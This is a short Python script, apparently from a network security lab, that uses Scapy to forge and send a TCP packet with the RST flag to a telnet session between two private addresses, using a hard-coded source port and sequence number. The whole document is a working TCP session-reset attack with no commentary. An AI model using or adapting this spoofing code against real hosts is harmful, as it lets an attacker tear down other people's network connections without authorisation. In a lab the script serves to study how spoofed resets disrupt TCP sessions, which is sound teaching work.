#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=48336, dport=23, flags="R", seq=2560596923)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)